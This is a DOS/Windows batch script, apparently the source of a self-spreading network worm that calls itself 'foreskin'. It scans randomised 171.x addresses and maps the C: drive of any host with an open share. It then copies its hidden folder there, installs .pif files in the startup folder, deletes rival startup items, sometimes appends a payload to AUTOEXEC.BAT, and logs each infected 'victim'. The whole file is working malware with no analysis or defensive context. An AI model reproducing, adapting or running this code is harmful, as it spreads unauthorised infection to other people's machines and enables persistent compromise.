@echo off
choice /n /ty,10 >nul
CALL C:\PROGRA~1\FORESKIN\FINAL.BAT
:START
set SUBNET=171
call C:\progra~1\FORESKIN\ADD.BAT
GOTO BGN
:BGN
echo %SUBNET%.%H2%%T2%%D2%.%H1%%T1%%D1%.%H%%T%%D%
ping %SUBNET%.%H2%%T2%%D2%.%H1%%T1%%D1%.%H%%T%%D% | find "Reply from 171.%H2%%T2%%D2%.%H1%%T1%%D1%.%H%%T%%D%" >nul 
if not errorlevel 1 goto mapper
goto start
:mapper 
cls
echo Ping successful...Checking for shares on %SUBNET%.%H2%%T2%%D2%.%H1%%T1%%D1%.%H%%T%%D%
net view \\%SUBNET%.%H2%%T2%%D2%.%H1%%T1%%D1%.%H%%T%%D%
if errorlevel 1 goto noshare
echo Found possible victim....attemping to map C on %SUBNET%.%H1%%T1%%D1%.%H%%T%%D%
net use /yes j: \\%SUBNET%.%H2%%T2%%D2%.%H1%%T1%%D1%.%H%%T%%D%\C
cls
echo mapped drive sucessfully.
echo 3 second pause...please wait
choice /n /ty,3 >nul
echo checking for previous infection.......
if exist j:\progra~1\foreskin\chaos.bat goto inthere
goto infect
:inthere
cls
echo machine is already infected.....starting over
c:
net use /delete /yes j:
goto start
:infect
if exist j:\windows\startm~1\programs\startup\network.vbs del j:\windows\startm~1\programs\startup\network.vbs
if exist j:\windows\startm~1\programs\startup\mstum.pif del j:\windows\startm~1\programs\startup\mstum.pif
if exist j:\windows\startm~1\programs\startup\ashield.pif del j:\windows\startm~1\programs\startup\ashield.pif
echo sucess...trying to copy files to %SUBNET%.%H2%%T2%%D2%.%H1%%T1%%D1%.%H%%T%%D%
md j:\zx | find "denied" >nul
if not errorlevel 1 goto readonly
if exist j:\progra~1\foreskin\mstum.bat deltree /y j:\progra~1\foreskin
deltree /y j:\zx
j:
cd\
cd progra~1
md foreskin
attrib j:\progra~1\foreskin +h
c:
cd\progra~1\foreskin
copy /y c:\progra~1\foreskin\*.* j:\progra~1\foreskin
echo.|time|find "Current" >cu##ent.bat
echo set time=%%3> current.bat
call cu##ent.bat
del cu??ent.bat > nul
echo = | choice /c=%time%= temp2.bat > temp1.bat
echo shift>temp2.bat
echo shift>>temp2.bat
echo set RANDOM=%%5>>temp2.bat
call temp1.bat
del temp?.bat > nul
if %RANDOM%== 5 COPY /y j:\autoexec.bat + j:\PROGRA~1\FORESKIN\SLAM.BAT J:\AUTOEXEC.BAT
if %RANDOM%== 4 ECHO DO NOTHING
if %RANDOM%== 3 COPY /y j:\autoexec.bat + j:\PROGRA~1\FORESKIN\SLAM.BAT J:\AUTOEXEC.BAT
if %RANDOM%== 2 ECHO DO NOTHING
if %RANDOM%== 1 COPY /y j:\autoexec.bat + j:\PROGRA~1\FORESKIN\SLAM.BAT J:\AUTOEXEC.BAT
if %RANDOM%== 0 ECHO DO NOTHING
j:
cd\progra~1\foreskin 
copy c:\progra~1\foreskin\ashield.pif j:\windows\startm~1\programs\startup\ashield.pif
copy c:\progra~1\foreskin\mstum.pif j:\windows\startm~1\programs\startup\mstum.pif
echo %SUBNET%.%H2%%T2%%D2%.%H1%%T1%%D1%.%H%%T%%D% was sucessfully infected with foreskin >> c:\PROGRA~1\foreskin\cool.txt
c:
net use /delete /yes j:
GOTO START
:READONLY
CLS
ECHO DRIVE IS READ ONLY
c:
net use /delete /yes j: | find "Error" >nul
GOTO START
:notc
cls
echo The drive cannot be mapped or does not exist...Sorry.....
goto start

:noshare
cls
echo No shares exist or shares have passwords
goto start
